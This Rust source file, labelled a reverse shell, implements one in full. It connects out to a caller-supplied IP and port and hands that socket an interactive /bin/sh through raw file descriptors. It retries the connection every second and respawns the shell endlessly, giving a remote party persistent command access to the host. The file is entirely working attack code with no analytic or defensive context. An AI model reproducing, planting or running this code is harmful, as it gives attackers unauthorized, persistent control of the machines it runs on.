
// Reverse  shell
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::{thread, time};


// Unix bases imports
use std::os::unix::io::{AsRawFd, FromRawFd};

pub fn shell(ip: String, port: String) {
    // ET, Phone Home!
    let home = [ip, port].join(":");

    sh(home)

}

fn sh(home: String){
    // Open TcpStream connection
    let s = connect(&home);

    // Raw FD for unix
    let fd = s.as_raw_fd();

    // Open shell
    let output = Command::new("/bin/sh")
        .arg("-i")
        // Unix-based stdio
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();


    // println!("Shell exited");
    sh(home);
}





fn connect(home: &String) -> TcpStream {
    let ten_millis = time::Duration::from_millis(1000);

    // Unwrap input
    let stream = TcpStream::connect(&home);
    if stream.is_ok() {
        return stream.unwrap()
    } else {
        thread::sleep(ten_millis);
        connect(&home)
    }
}
